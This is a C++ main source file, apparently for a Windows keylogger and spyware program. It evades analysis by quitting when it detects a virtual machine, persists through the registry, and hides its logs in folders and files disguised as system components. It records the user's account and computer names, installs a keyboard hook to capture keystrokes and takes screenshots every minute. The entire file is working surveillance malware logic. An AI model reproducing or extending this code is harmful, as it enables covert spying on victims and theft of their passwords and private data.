#include "stream.h"
#include "keyhook.h"
#include "screen.h"
#include "sys.h"
#include "debug.h"

int main() {

#ifdef DEBUG_BUILD
  std::string path = Stream::GetPath(R"(\Microsoft\SystemService\)");
  Screen::CaptureScreen(path, "winpst", true, 1000);

#endif

#ifndef DEBUG_BUILD
  if (Sys::CheckForVirtualMachine()) {
	KeyHook::UninstallHook();
	Sys::RemoveFromRegistry();
	KeyHook::KillProcess();
	return 0;
  }

  // ------------------ SETUP -------------------- //
  Sys::AddToRegistry();
  Crypt::GenerateKeys();
  KeyHook::InstallHook();

  pClientInfo = &clientInfo;

  Stream::GetAccountInfo(pClientInfo);


  // --------------- FILESYSTEM ------------------ //
  {
	std::string path = Stream::GetPath("\\Microsoft\\");
	encrDir.path = mainDir.path = path;
  }

  mainDir.name = "SystemService";
  encrDir.name = "BootSetup";

  Stream::MakeDir(mainDir.path, mainDir.name, FILE_ATTRIBUTE_HIDDEN);
  Stream::MakeDir(encrDir.path, encrDir.name, FILE_ATTRIBUTE_HIDDEN);

  Stream::MakeFile("wnxshl2.sys.log", mainDir.path + mainDir.name);
  Stream::MakeFile("boothandler.sys.log", mainDir.name);


  // ---------------- LOGFILE -------------------- //
  Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, false);

  std::ostringstream ostream;
  DWORD major = pClientInfo->osVersionInfo.dwMajorVersion;
  DWORD minor = pClientInfo->osVersionInfo.dwMinorVersion;
  char *acc = pClientInfo->accountName;
  char *com = pClientInfo->computerName;
  ostream << "\n[*] OS Info: Major - " << major << "; Minor - " << minor << " [*]"
		  << "\n[*] Account Info: User -" << acc << "; Computer - " << com << " [*]";
  std::string write = ostream.str();
  Stream::WriteLog(write, KeyHook::activeProcess, false);

  Screen::CaptureScreen(mainDir.path, "winpst", true, 60000);


  // -------------- KEY LOGGER ------------------- //
  KeyHook::HandleMessage(true);

#endif // DEBUG_BUILD
  return 0;
}